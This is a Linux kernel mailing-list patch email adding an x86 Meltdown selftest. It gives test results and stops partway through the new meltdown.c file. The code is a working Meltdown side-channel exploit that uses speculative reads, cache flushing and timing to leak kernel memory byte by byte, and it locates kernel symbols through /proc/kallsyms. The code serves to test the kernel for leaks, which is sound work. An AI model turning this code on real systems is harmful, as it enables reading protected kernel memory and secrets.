Return-Path: <linux-kselftest-owner@vger.kernel.org>
X-Original-To: lists+linux-kselftest@lfdr.de
Delivered-To: lists+linux-kselftest@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id AF54765EAC3
	for <lists+linux-kselftest@lfdr.de>; Thu,  5 Jan 2023 13:35:35 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S231933AbjAEMfc (ORCPT <rfc822;lists+linux-kselftest@lfdr.de>);
        Thu, 5 Jan 2023 07:35:32 -0500
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:59528 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S231429AbjAEMfZ (ORCPT
        <rfc822;linux-kselftest@vger.kernel.org>);
        Thu, 5 Jan 2023 07:35:25 -0500
Received: from mga11.intel.com (mga11.intel.com [192.55.52.93])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 155034E404;
        Thu,  5 Jan 2023 04:35:24 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
  t=1672922124; x=1704458124;
  h=date:from:to:cc:subject:message-id:mime-version;
  bh=eRWfHFwyVVQEXyIimVYp1FwigcGlPijx4PtSGk5UPL4=;
  b=LWHLCgudiA/nh826n0J7wGbzPZ/IJ6AtEbZrQ9QTBnl0KUNOK7QWFuvT
   oiYE4t4erfF9W2H8drZonZoNs+3m7DP1NLWs4oSxqt1yAx/AO8Ah37oga
   xnjpofbObnVy+IdpIoh/FZlzECoVCpVcCmrHxVUum/uYVEBimWBRZo1uj
   HGI8U/iv/hRZX1sW6RNPMBEZZefnXzXsaDNeVZ3hpxgCgj/kDSrI38wQx
   X0GHdfRtdTM0J2SA2t5Oz8TfkXlsLNHcEcLRILkF/7AI5k0R6Dd53xFxW
   GgtPyejmAG+2pcATVDjJksrB6tmomJ3ZROA6Vg9KgAbnasOKklwFC/+SF
   Q==;
X-IronPort-AV: E=McAfee;i="6500,9779,10580"; a="319899412"
X-IronPort-AV: E=Sophos;i="5.96,302,1665471600"; 
   d="scan'208";a="319899412"
Received: from orsmga005.jf.intel.com ([10.7.209.41])
  by fmsmga102.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 05 Jan 2023 04:35:23 -0800
X-ExtLoop1: 1
X-IronPort-AV: E=McAfee;i="6500,9779,10580"; a="829539015"
X-IronPort-AV: E=Sophos;i="5.96,302,1665471600"; 
   d="scan'208";a="829539015"
Received: from orsmsx603.amr.corp.intel.com ([10.22.229.16])
  by orsmga005.jf.intel.com with ESMTP; 05 Jan 2023 04:35:23 -0800
Received: from orsmsx612.amr.corp.intel.com (10.22.229.25) by
 ORSMSX603.amr.corp.intel.com (10.22.229.16) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2507.16; Thu, 5 Jan 2023 04:35:23 -0800
Received: from orsmsx610.amr.corp.intel.com (10.22.229.23) by
 ORSMSX612.amr.corp.intel.com (10.22.229.25) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2507.16; Thu, 5 Jan 2023 04:35:22 -0800
Received: from ORSEDG602.ED.cps.intel.com (10.7.248.7) by
 orsmsx610.amr.corp.intel.com (10.22.229.23) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2507.16 via Frontend Transport; Thu, 5 Jan 2023 04:35:22 -0800
Received: from NAM12-DM6-obe.outbound.protection.outlook.com (104.47.59.174)
 by edgegateway.intel.com (134.134.137.103) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.1.2507.16; Thu, 5 Jan 2023 04:35:22 -0800
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=NVE8z+ONSUoQzRj+S9onSlJxcXBfHEq4zK6Bu0wljcqnb/ToulPi13aRCG3xaWG3qub4GjCWQkzcqHkvLw/gBmGo7qQTbnf1sCg1b1buCtM9u+1nSpuGU1jiBVJl13ePjW67d9KZrW8n/BUFNYi9HP+Ee6A6+jpEqrESSA9ew2V/hue7iONqPQvP9doLg7xFp+Ad/6JYTqvU1nLxqXittb2ckpOpm+18PReKXdcgCenIwjeW4WtIwigiCoGSEXyMnRDwEMqkljJKcHO1EFScJsz8GcNxsKvekP4nr+CQypRqnG1KiLBc+EexErnJh4gnjQxHmC1QmSQg6F0vDD2tBQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=Lr31sFTFVv+bseBPcO7h8pDrj9bvVt19E26tix3eltY=;
 b=JeGuR/q0AntRYrxSNAZMQnYkq7BAX7botALBpsdgsVEoOKQ6+NrRsCsLsfx9Qf+3WFB64Oa6o9TFUwvq05X3sI2ARkP2/HrKpyOL3C30eSNVjpjYs/JZPWfGt+MKYC7uI83MzgUa7oQ7TFRBz7dlS0DzTz39c0F3CIGb9Vl/9gEiPLGT4BVnMyXyjGdyblsBkpGzube1UV+6KZuXpygizYj34toGhIYNQnSDzRdChx4mc/gqY2AH8XfvCezR3K51a3FwODzi9J7eQ1rxEN+xUK82sthKAy/yh/SQqCbi2Qp+mcP3XetF+MAb93DdwVkcre5bEYO301RZqU6kIod8MA==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=intel.com; dmarc=pass action=none header.from=intel.com;
 dkim=pass header.d=intel.com; arc=none
Authentication-Results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=intel.com;
Received: from BYAPR11MB3062.namprd11.prod.outlook.com (2603:10b6:a03:92::18)
 by IA1PR11MB8174.namprd11.prod.outlook.com (2603:10b6:208:450::13) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.5944.19; Thu, 5 Jan
 2023 12:35:17 +0000
Received: from BYAPR11MB3062.namprd11.prod.outlook.com
 ([fe80::e478:cda7:b9c4:c457]) by BYAPR11MB3062.namprd11.prod.outlook.com
 ([fe80::e478:cda7:b9c4:c457%5]) with mapi id 15.20.5944.019; Thu, 5 Jan 2023
 12:35:16 +0000
Date:   Thu, 5 Jan 2023 20:35:05 +0800
From:   Aaron Lu <aaron.lu@intel.com>
To:     Dave Hansen <dave.hansen@intel.com>,
        Pavel Boldin <pboldin@cloudlinux.com>
CC:     Pavel Boldin <boldin.pavel@gmail.com>,
        "Raphael S. Carvalho" <raphaelsc@scylladb.com>,
        Moritz Lipp <github@mlq.me>,
        Daniel Gruss <daniel.gruss@iaik.tugraz.at>,
        Michael Schwarz <michael.schwarz91@gmail.com>,
        Greg KH <gregkh@linuxfoundation.org>,
        <linux-kselftest@vger.kernel.org>, <linux-kernel@vger.kernel.org>
Subject: [PATCH] selftest/x86/meltdown: Add a selftest for meltdown
Message-ID: <Y7bD+R/cxZ4p/nWe@ziqianlu-desk1>
Content-Type: text/plain; charset="us-ascii"
Content-Disposition: inline
X-ClientProxiedBy: SG2PR01CA0193.apcprd01.prod.exchangelabs.com
 (2603:1096:4:189::18) To BYAPR11MB3062.namprd11.prod.outlook.com
 (2603:10b6:a03:92::18)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: BYAPR11MB3062:EE_|IA1PR11MB8174:EE_
X-MS-Office365-Filtering-Correlation-Id: 6c39fe50-6789-4782-cc3f-08daef194c76
X-LD-Processed: 46c98d88-e344-4ed4-8496-4ed7712e255d,ExtAddr
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: YUQzZyxmZE1z8c+eaKybungQHRtlLO3aoS7nWNnm7oQsHTZwREK+kCmqVxzOHGuc01NkA6QnSbWcEoDEqlrZTdG43RsM0JrptErzaFf9b8Ad9UpmvR9QK+Zpf1g7rfxLB5YooHCBqnC8IJK01Xo2rSpPeP4R7Lek7sbsCjQJYv54ZoZ1ONCe0sckT2ZzuqXgbEjk0wG4aG2vkgwuewNhi+7e6TvNLC/hwYytd2iZly5ERigpWtDp+U6/XU3AAPrrPXiHl4LXP4MX3s0oZ7MstfM8UJG0SIvdvuKS+okRBu3cTA4FiyRE2bKYrEhmuzRc6h/KdSxRjUmFXNPOplm2xBjN6NuADp52lzERe4oq8n3d4wJCLgLlXG+bDrCRYJ/vpqL2DyyHgAkHIBdTGgAY4352bbM85bJInWZgz5UhdcIebjCqxd91a0Dx9MkK4k52+VieEDYT1wwhihAqfgsW9uMwqRFkGpYA01SJ9xTKUAkba6YLOT47rLX0W5UyHy3BrQX4c4fHcZZkKC1+GWJ0N0fSzH94ZQ9EsGW6C4vQsec93Q4mDQeeZTlQYg8zCTAe9n/qqcwnXD60Cl4TuAP6r2NGs6rJ7d0GtoOW2wK9tVjuTc5unC7vtxkQygp3L9ovJEJ9KFH3r9ELutvEDblh3RwVGSD0Ih3RMCFISLhpmCE=
X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:BYAPR11MB3062.namprd11.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230022)(7916004)(346002)(396003)(376002)(39860400002)(136003)(366004)(451199015)(110136005)(316002)(54906003)(6486002)(966005)(186003)(26005)(66476007)(6506007)(4326008)(6666004)(9686003)(478600001)(41300700001)(44832011)(30864003)(8936002)(5660300002)(83380400001)(2906002)(66556008)(66946007)(6512007)(8676002)(38100700002)(82960400001)(86362001)(33716001);DIR:OUT;SFP:1102;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: =?us-ascii?Q?Kl1jJqPkGzhACi2OmeXcCb86SiMJV80k4Ovld6jYm6W6sOdVgK2mLPi09M1L?=
 =?us-ascii?Q?2AFq2g3uN1qXR/So3x7qtsAXyJvy1ekGWKmdAJTjVLlct9e0tE0i8CRH4eJI?=
 =?us-ascii?Q?iqX6g9HKYVMgtcSer8+TajLPNyxeUd0GvKbNz6RRNZ7KExYt/nCMrJ0zKrk8?=
 =?us-ascii?Q?KfRIjxTZPrw5CNa8VVAczuxBRtGeFAQZgnPEHEbBkHN2w0IPHoe/8UdSFt2+?=
 =?us-ascii?Q?wP97qieCW/7CgO3ByLVwke6S2f5oleeSHdLHd7F4XvTjcbhaqmddEhcoZsq+?=
 =?us-ascii?Q?Aj8z9LdyMiuceJ+rmIT44XQOYo+Uc15NvR8fCTI98epB/SebchnwVYLioI2l?=
 =?us-ascii?Q?dblWPTBc5GBRth4V/ygT583n3ZaLnm8BZoI8C4FsgNg7dqxaVHjul7n+qqz0?=
 =?us-ascii?Q?RVg42wW2IrgiwwkedVyRWQDV8tC/dDEgPsPByFONJ8FN2WwwZyy5ZBWVxlBj?=
 =?us-ascii?Q?AlWgnBqz7Ue/6XUC5xAcBFbKo6hTMYfOEPwP933mDHUUZGMuAXiqd3wPLbdw?=
 =?us-ascii?Q?jicdqx62LAdG45kZA766RhpJ+69tngbyOSXJAZTxJNzwLXiwCkJagoGazoTf?=
 =?us-ascii?Q?7zroG3Nz1rrBzfcFFMiAik0qpZg1W21/aZY+uwv2FM31mFvK5ZEATIu2HNVi?=
 =?us-ascii?Q?uw5sADxABZc06oOhTEL12XcPB9SFPTqHk4Xxl5oCa1iFjAW0oU5D3egQfGyM?=
 =?us-ascii?Q?n6L3diWkLjzapljkC6mrTqYX4PMbXvbApZv91Qij4XsoDbSRfgJLNnecFS6X?=
 =?us-ascii?Q?kTolQ5X+THw92iig8Q/mMHTMyOiyp4rxrtpP+2PdY49aIq7t5Sg91Xad6lx+?=
 =?us-ascii?Q?7+qOk0SP/XDIzJv3vmlcRfVtPdLtXqYtyh2YgH5ujnPOvKxbIKuEu/im/zPE?=
 =?us-ascii?Q?gRPb3FZFIoMowJsDhBrioS/8hOlV91AbmRqk2mKukBZ9kMUGhIUPH76RHaBm?=
 =?us-ascii?Q?IYE6xdH7kDtbm45RiDB3d0oki1W1x9Z/NBLbaBxfho9pIh7ljf4Z2x93bQnu?=
 =?us-ascii?Q?bT0p0HfD8dgz05th/CVRNMcUL8thfZIyakOrOnbROVGFXYOVIz19IA4aTVoK?=
 =?us-ascii?Q?KRGwDp+6842iq383eD2VoXXguwBgSdu6xGWY0ksN3qtp0qeyS+Hdg+LfRmpg?=
 =?us-ascii?Q?0vjkvgYkxUq8hzqz52ORj6bfWF7O1M1wPzLpQDIMAKwgbA0duRbfA5zHQtZC?=
 =?us-ascii?Q?NIOpOuL2OGW+OS92G3OY/ev5HiBVRD/pC7AJMQXtcO+0fy4ukhSTOqcb/xzh?=
 =?us-ascii?Q?CEZMb4ATromUHSI2KBrq6HJerYhGSWlEzY6yBhB6qt+D7fL48hjcL8gHk6AK?=
 =?us-ascii?Q?5rbV2h3QEivXBQGmCF90hDZBSzkHO66xrMBkfIuEFwOGY1zxKpAg8MW9eiNh?=
 =?us-ascii?Q?UJSULz0del0vD0LtW9nGTf/W4fJxFxb2YK6GSnC2DQSXLUtYGht9TtD5kT8T?=
 =?us-ascii?Q?9xxXrVRdvlSXfOpLsNjl4mRMeUhdDuBCzwVkhfN9Ah8TCPwO+BHHFflOJ6RN?=
 =?us-ascii?Q?/UpvvJPoSPlRrd9sThkvINAbZNw80FsnyZ3qyn/4gee3VIWkBcEnspbMzBla?=
 =?us-ascii?Q?REO5GTGkSRO6TLF6SoyHrVz91TFxDtJEQjCBP4t+?=
X-MS-Exchange-CrossTenant-Network-Message-Id: 6c39fe50-6789-4782-cc3f-08daef194c76
X-MS-Exchange-CrossTenant-AuthSource: BYAPR11MB3062.namprd11.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 05 Jan 2023 12:35:16.5077
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 46c98d88-e344-4ed4-8496-4ed7712e255d
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: fkoN37A3OxwIiAvy9tZ7E/6OjuFvC8Ji6dnze5d15g2dAKu7gvQeXEvtxrx7yavIQLgNPzbuHU/XY+pXkqopQA==
X-MS-Exchange-Transport-CrossTenantHeadersStamped: IA1PR11MB8174
X-OriginatorOrg: intel.com
X-Spam-Status: No, score=-4.4 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_MED,
        SPF_HELO_NONE,SPF_NONE autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kselftest.vger.kernel.org>
X-Mailing-List: linux-kselftest@vger.kernel.org

To capture potential programming errors like mistakenly setting Global
bit on kernel page table entries, a selftest for meltdown is added.

This selftest is based on Pavel Boldin's work at:
https://github.com/linux-test-project/ltp/blob/master/testcases/cve/meltdown.c

In addition to the existing test of reading kernel variable
saved_command_line from user space, one more test of reading user local
variable through kernel direct map address is added. For the existing
test(reading saved_command_line) to report a failure, both the high kernel
mapping and low kernel mapping have to be in leaked state; For the added
test(read local var), only low kernel mapping leak is enough to trigger
a test fail, so both tests are useful.

Test results of 10 runs:

On v6.1-rc8 with nopti kernel cmdline option:

host              test_out_rate_1    test_out_rate_2
lkp-bdw-de1            50%               100%
lkp-hsw-d01            70%               100%
lkp-hsw-d02             0%                80%
lkp-hsw-d03            60%               100%
lkp-hsw-d04            20%               100%
lkp-hsw-d05            60%               100%
lkp-ivb-d01             0%                70%
lkp-kbl-d01           100%               100%
lkp-skl-d02           100%                90%
lkp-skl-d03            90%               100%
lkp-skl-d05            60%               100%
kbl-vm                100%                80%
2 other machines have 0% rate for both tests.

bdw=broadwell, hsw=haswell, ivb=ivybridge, etc.

test_out_rate_1: test reports fail rate for the test of reading
saved_command_line from user space;
test_out_rate_2: test reports fail rate for the test of reading user
local variable through kernel direct map address in user space.

On v5.19 without nopti cmdline option:
host              test_out_rate_2
lkp-bdw-de1            80%
lkp-hsw-4ex1           50%
lkp-hsw-d01            30%
lkp-hsw-d03            10%
lkp-hsw-d04            10%
lkp-kbl-d01            10%
kbl-vm                 80%
7 other machines have 0% rate for test2.

Also tested on an i386 VM with 512M memory and the test out rate is 100%
when adding nopti to kernel cmdline with v6.1-rc8.

Main changes I made from Pavel Boldin's meltdown test are:
- Replace rdtscll() and clflush() with kernel's implementation;
- Reimplement find_symbol_in_file() to avoid bringing in LTP's library
  functions;
- Coding style changes: placing the function return type in the same
  line of the function.

Signed-off-by: Aaron Lu <aaron.lu@intel.com>
---
Notable changes from RFC v3:
- Drop RFC tag;
- Change the base code from zlib licensed one to GPL licensed one.

 tools/testing/selftests/x86/Makefile   |   2 +-
 tools/testing/selftests/x86/meltdown.c | 529 +++++++++++++++++++++++++
 2 files changed, 530 insertions(+), 1 deletion(-)
 create mode 100644 tools/testing/selftests/x86/meltdown.c

diff --git a/tools/testing/selftests/x86/Makefile b/tools/testing/selftests/x86/Makefile
index 0388c4d60af0..36f99c360a56 100644
--- a/tools/testing/selftests/x86/Makefile
+++ b/tools/testing/selftests/x86/Makefile
@@ -13,7 +13,7 @@ CAN_BUILD_WITH_NOPIE := $(shell ./check_cc.sh "$(CC)" trivial_program.c -no-pie)
 TARGETS_C_BOTHBITS := single_step_syscall sysret_ss_attrs syscall_nt test_mremap_vdso \
 			check_initial_reg_state sigreturn iopl ioperm \
 			test_vsyscall mov_ss_trap \
-			syscall_arg_fault fsgsbase_restore sigaltstack
+			syscall_arg_fault fsgsbase_restore sigaltstack meltdown
 TARGETS_C_32BIT_ONLY := entry_from_vm86 test_syscall_vdso unwind_vdso \
 			test_FCMOV test_FCOMI test_FISTTP \
 			vdso_restorer
diff --git a/tools/testing/selftests/x86/meltdown.c b/tools/testing/selftests/x86/meltdown.c
new file mode 100644
index 000000000000..fcb211dc9038
--- /dev/null
+++ b/tools/testing/selftests/x86/meltdown.c
@@ -0,0 +1,529 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (c) 2018 Pavel Boldin <pboldin@cloudlinux.com>
+ * https://github.com/linux-test-project/ltp/blob/master/testcases/cve/meltdown.c
+ */
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdarg.h>
+#include <string.h>
+#include <signal.h>
+#include <ucontext.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <ctype.h>
+#include <sys/utsname.h>
+#include <sys/mman.h>
+
+#define PAGE_SHIFT	12
+#define PAGE_SIZE	0x1000
+#define PUD_SHIFT       30
+#define PUD_SIZE        (1UL << PUD_SHIFT)
+#define PUD_MASK        (~(PUD_SIZE - 1))
+
+size_t cache_miss_threshold;
+unsigned long directmap_base;
+
+#define TARGET_OFFSET	9
+#define TARGET_SIZE	(1 << TARGET_OFFSET)
+#define BITS_BY_READ	2
+
+static inline uint64_t rdtsc(void)
+{
+	uint32_t eax, edx;
+	uint64_t tsc_val;
+	/*
+	 * The lfence is to wait (on Intel CPUs) until all previous
+	 * instructions have been executed. If software requires RDTSC to be
+	 * executed prior to execution of any subsequent instruction, it can
+	 * execute LFENCE immediately after RDTSC
+	 *                                              */
+	__asm__ __volatile__("lfence; rdtsc; lfence" : "=a"(eax), "=d"(edx));
+	tsc_val = ((uint64_t)edx) << 32 | eax;
+	return tsc_val;
+}
+
+static inline void clflush(volatile void *__p)
+{
+	asm volatile("clflush %0" : "+m" (*(volatile char *)__p));
+}
+
+static char target_array[BITS_BY_READ * TARGET_SIZE];
+
+static void clflush_target(void)
+{
+	int i;
+
+	for (i = 0; i < BITS_BY_READ; i++)
+		clflush(&target_array[i * TARGET_SIZE]);
+}
+
+extern char failshere[];
+extern char stopspeculate[];
+
+static void __attribute__((noinline)) speculate(unsigned long addr, char bit)
+{
+	register char mybit asm ("cl") = bit;
+#ifdef __x86_64__
+	asm volatile (
+		"1:\n\t"
+
+		".rept 300\n\t"
+		"add $0x141, %%rax\n\t"
+		".endr\n"
+
+		"failshere:\n\t"
+		"movb (%[addr]), %%al\n\t"
+		"ror %[bit], %%rax\n\t"
+		"and $1, %%rax\n\t"
+		"shl $9, %%rax\n\t"
+		"jz 1b\n\t"
+
+		"movq (%[target], %%rax, 1), %%rbx\n"
+
+		"stopspeculate: \n\t"
+		"nop\n\t"
+		:
+		: [target] "r" (target_array),
+		  [addr] "r" (addr),
+		  [bit] "r" (mybit)
+		: "rax", "rbx"
+	);
+#else /* defined(__x86_64__) */
+	asm volatile (
+		"1:\n\t"
+
+		".rept 300\n\t"
+		"add $0x141, %%eax\n\t"
+		".endr\n"
+
+		"failshere:\n\t"
+		"movb (%[addr]), %%al\n\t"
+		"ror %[bit], %%eax\n\t"
+		"and $1, %%eax\n\t"
+		"shl $9, %%eax\n\t"
+		"jz 1b\n\t"
+
+		"movl (%[target], %%eax, 1), %%ebx\n"
+
+		"stopspeculate: \n\t"
+		"nop\n\t"
+		:
+		: [target] "r" (target_array),
+		  [addr] "r" (addr),
+		  [bit] "r" (mybit)
+		: "rax", "ebx"
+	);
+#endif
+}
+
+#ifdef __i386__
+# define REG_RIP	REG_EIP
+#endif
+
+static void sigsegv(int sig, siginfo_t *siginfo, void *context)
+{
+	ucontext_t *ucontext = context;
+	unsigned long *prip = (unsigned long *)&ucontext->uc_mcontext.gregs[REG_RIP];
+	if (*prip != (unsigned long)failshere) {
+		printf("Segmentation fault at unexpected location %lx\n", *prip);
+		abort();
+	}
+	*prip = (unsigned long)stopspeculate;
+	return;
+}
+
+static int set_signal(void)
+{
+	struct sigaction act = {
+		.sa_sigaction = sigsegv,
+		.sa_flags = SA_SIGINFO,
+	};
+
+	return sigaction(SIGSEGV, &act, NULL);
+}
+
+static inline int get_access_time(volatile char *addr)
+{
+	unsigned long long time1, time2;
+	volatile int j __attribute__((__unused__));
+
+	time1 = rdtsc();
+	j = *addr;
+	time2 = rdtsc();
+
+	return time2 - time1;
+}
+
+static int cache_hit_threshold;
+static int hist[BITS_BY_READ];
+
+static void check(void)
+{
+	int i, time;
+	volatile char *addr;
+
+	for (i = 0; i < BITS_BY_READ; i++) {
+		addr = &target_array[i * TARGET_SIZE];
+
+		time = get_access_time(addr);
+
+		if (time <= cache_hit_threshold)
+			hist[i]++;
+	}
+}
+
+#define CYCLES 10000
+static int readbit(int fd, unsigned long addr, char bit)
+{
+	int i, ret;
+	static char buf[256];
+
+	memset(hist, 0, sizeof(hist));
+
+	for (i = 0; i < CYCLES; i++) {
+		/*
+		 * Make the to-be-stolen data cache and tlb hot
+		 * to increase success rate.
+		 */
+		ret = pread(fd, buf, sizeof(buf), 0);
+		if (ret < 0)
+			printf("[INFO]\tCan't read fd");
+
+		clflush_target();
+
+		speculate(addr, bit);
+		check();
+	}
+
+	if (hist[1] > CYCLES / 10)
+		return 1;
+	return 0;
+}
+
+static int readbyte(int fd, unsigned long addr)
+{
+	int bit, res = 0;
+
+	for (bit = 0; bit < 8; bit ++ )
+		res |= (readbit(fd, addr, bit) << bit);
+
+	return res;
+}
+
+static int mysqrt(long val)
+{
+	int root = val / 2, prevroot = 0, i = 0;
+
+	while (prevroot != root && i++ < 100) {
+		prevroot = root;
+		root = (val / root + root) / 2;
+	}
+
+	return root;
+}
+
+#define ESTIMATE_CYCLES	1000000
+static void set_cache_hit_threshold(void)
+{
+	long cached, uncached, i;
+
+	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
+		cached += get_access_time(target_array);
+
+	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
+		cached += get_access_time(target_array);
+
+	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
+		clflush(target_array);
+		uncached += get_access_time(target_array);
+	}
+
+	cached /= ESTIMATE_CYCLES;
+	uncached /= ESTIMATE_CYCLES;
+
+	cache_hit_threshold = mysqrt(cached * uncached);
+
+	printf("[INFO]\taccess time: cached = %ld, uncached = %ld, threshold = %d\n",
+		cached, uncached, cache_hit_threshold);
+}
+
+static unsigned long find_symbol_in_file(const char *filename, const char *symname)
+{
+	unsigned long addr;
+	char type, *buf;
+	int found;
+	FILE *fp;
+
+	fp = fopen(filename, "r");
+	if (!fp) {
+		printf("[INFO]\tFailed to open %s\n", filename);
+		return 0;
+	}
+
+	buf = malloc(4096);
+	if (!buf)
+		return 0;
+
+	found = 0;
+	while (fscanf(fp, "%lx %c %s\n", &addr, &type, buf)) {
+		if (!strcmp(buf, symname)) {
+			found = 1;
+			break;
+		}
+	}
+
+	free(buf);
+	fclose(fp);
+
+	return found ? addr : 0;
+}
+
+static unsigned long find_kernel_symbol(const char *name)
+{
+	char systemmap[256];
+	struct utsname utsname;
+	unsigned long addr;
+
+	addr = find_symbol_in_file("/proc/kallsyms", name);
+	if (addr)
+		return addr;
+
+	if (uname(&utsname) < 0)
+		return 0;
+	sprintf(systemmap, "/boot/System.map-%s", utsname.release);
+	addr = find_symbol_in_file(systemmap, name);
+	return addr;
+}
+
+static unsigned long saved_cmdline_addr;
+static int spec_fd;
+
+#define READ_SIZE 32
+
+static int test_read_saved_command_line(void)
+{
+	unsigned int i, score = 0, ret;
+	unsigned long addr;
+	unsigned long size;
+	char read[READ_SIZE] = { 0 };
+	char expected[READ_SIZE] = { 0 };
+	int expected_len;
+
+	saved_cmdline_addr = find_kernel_symbol("saved_command_line");
+	if (!saved_cmdline_addr) {
+		printf("[SKIP]\tCan not find symbol saved_command_line\n");
+		return 0;
+	}
+	printf("[INFO]\tsaved_cmdline_addr: 0x%lx\n", saved_cmdline_addr);
+
+	spec_fd = open("/proc/cmdline", O_RDONLY);
+	if (spec_fd == -1) {
+		printf("[SKIP]\tCan not open /proc/cmdline\n");
+		return 0;
+	}
+
+	expected_len = pread(spec_fd, expected, sizeof(expected), 0);
+	if (expected_len < 0) {
+		printf("[SKIP]\tCan't read /proc/cmdline\n");
+		return 0;
+	}
+
+	/* read address of saved_cmdline_addr */
+	addr = saved_cmdline_addr;
+	size = sizeof(addr);
+	for (i = 0; i < size; i++) {
+		ret = readbyte(spec_fd, addr);
+		read[i] = ret;
+		addr++;
+	}
+
+	/* read value pointed to by saved_cmdline_addr */
+	memcpy(&addr, read, sizeof(addr));
+	memset(read, 0, sizeof(read));
+	printf("[INFO]\tsaved_command_line: 0x%lx\n", addr);
+	size = expected_len;
+
+	if (!addr)
+		goto done;
+
+	for (i = 0; i < size; i++) {
+		ret = readbyte(spec_fd, addr);
+		read[i] = ret;
+		addr++;
+	}
+
+	for (i = 0; i < size; i++)
+		if (expected[i] == read[i])
+			score++;
+
+done:
+	if (score > size / 2) {
+		printf("[FAIL]\ttest_read_saved_command_line: both high and low kernel mapping leak found.\n");
+		ret = -1;
+	} else {
+		printf("[OK]\ttest_read_saved_command_line: no leak found.\n");
+		ret = 0;
+	}
+
+	close(spec_fd);
+
+	return ret;
+}
+
+static int get_directmap_base(void)
+{
+	char *buf;
+	FILE *fp;
+	size_t n;
+	int ret;
+
+	fp = fopen("/sys/kernel/debug/page_tables/kernel", "r");
+	if (!fp)
+		return -1;
+
+	buf = NULL;
+	ret = -1;
+	while (getline(&buf, &n, fp) != -1) {
+		if (!strstr(buf, "Kernel Mapping"))
+			continue;
+
+		if (getline(&buf, &n, fp) != -1 &&
+		    sscanf(buf, "0x%lx", &directmap_base) == 1) {
+			printf("[INFO]\tdirectmap_base=0x%lx/0x%lx\n", directmap_base, directmap_base & PUD_MASK);
+			directmap_base &= PUD_MASK;
+			ret = 0;
+			break;
+		}
+	}
+
+	fclose(fp);
+	free(buf);
+	return ret;
+}
+
+static int virt_to_phys(unsigned long virt, unsigned long *phys)
+{
+	unsigned long pfn;
+	uint64_t val;
+	int fd, ret;
+
+	fd = open("/proc/self/pagemap", O_RDONLY);
+	if (fd == -1) {
+		printf("[INFO]\tFailed to open pagemap\n");
+		return -1;
+	}
+
+	ret = pread(fd, &val, sizeof(val), (virt >> PAGE_SHIFT) * sizeof(uint64_t));
+	if (ret == -1) {
+		printf("[INFO]\tFailed to read pagemap\n");
+		goto out;
+	}
+
+	if (!(val & (1ULL << 63))) {
+		printf("[INFO]\tPage not present according to pagemap\n");
+		ret = -1;
+		goto out;
+	}
+
+	pfn = val & ((1ULL << 55) - 1);
+	if (pfn == 0) {
+		printf("[INFO]\tNeed CAP_SYS_ADMIN to show pfn\n");
+		ret = -1;
+		goto out;
+	}
+
+	ret = 0;
+	*phys = (pfn << PAGE_SHIFT) | (virt & (PAGE_SIZE - 1));
+
+out:
+	close(fd);
+	return ret;
+}
+
+static int test_read_local_var(void)
+{
+	char path[] = "/tmp/meltdown.XXXXXX";
+	char string[] = "test string";
+	unsigned long phys;
+	int i, len, ret;
+	char *result;
+	void *p;
+
+	if (get_directmap_base() == -1) {
+		printf("[SKIP]\tFailed to get directmap base. Need root and CONFIG_PTDUMP_DEBUGFS\n");
+		return 0;
+	}
+
